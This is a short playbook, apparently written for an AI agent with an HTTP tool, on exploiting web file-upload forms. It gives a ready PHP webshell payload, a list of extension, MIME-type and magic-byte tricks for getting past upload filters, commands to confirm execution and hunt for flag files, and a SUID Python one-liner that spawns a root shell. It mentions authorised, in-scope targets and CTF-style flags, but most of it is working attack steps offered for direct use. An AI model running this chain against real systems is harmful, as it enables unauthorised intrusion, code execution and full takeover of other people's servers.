# Web file-upload to RCE

Playbook for turning an authorised web upload form into command execution, then escalating. Use only on in-scope targets.

## 1. Drop the webshell in one call
Use `http_request` (no separate `write_file` needed):
- `method="POST"`, `url` = the form's action (often the page itself, e.g. `/panel/`)
- `upload_content="<?php system($_GET['c']); ?>"`
- `upload_filename="shell.phtml"` — controls the **saved extension** (decisive for execution)
- `upload_field_name` = the form's file field (read the HTML `<input type=file name=...>`, e.g. `fileUpload`)
- `form_fields="submit=Upload"` — many handlers only process the file when the **submit button field** (or CSRF token) is present. Without it the upload silently does nothing.

## 2. If `.php` is blocked, rotate the extension
A 200 response does NOT mean success — confirm by requesting the file under the uploads dir with `?c=id`. If 404 / no `uid=`, the extension was filtered. Try, in order:
`.phtml`, `.php5`, `.php4`, `.php3`, `.php7`, `.pht`, `.phar`, then case tricks `.pHp` / `.pHtml`. `.phps` often returns source, not execution.
Other bypasses: spoof `Content-Type: image/png`, prepend image magic bytes (`GIF89a;`), or double extension `shell.php.jpg` where the parser is loose.

## 3. Confirm + loot
- `GET /uploads/shell.phtml?c=id` → expect `uid=33(www-data)`.
- Locate flags broadly: `find / -name user.txt 2>/dev/null` (may live in `/var/www`, not `/home`).

## 4. Privilege escalation
Enumerate SUID: `find / -perm -4000 -type f 2>/dev/null`. Flag anything unusual outside the standard set (`mount`, `su`, `sudo`, `passwd`, `chsh`...). Interpreters/tools with SUID are the win — check GTFOBins. Example seen in the field: SUID `python2.7` → `python2.7 -c 'import os;os.setuid(0);os.system("/bin/sh")'` = root.

Do not loop: if the same request yields the same result twice, change the extension/field/approach rather than repeating it.
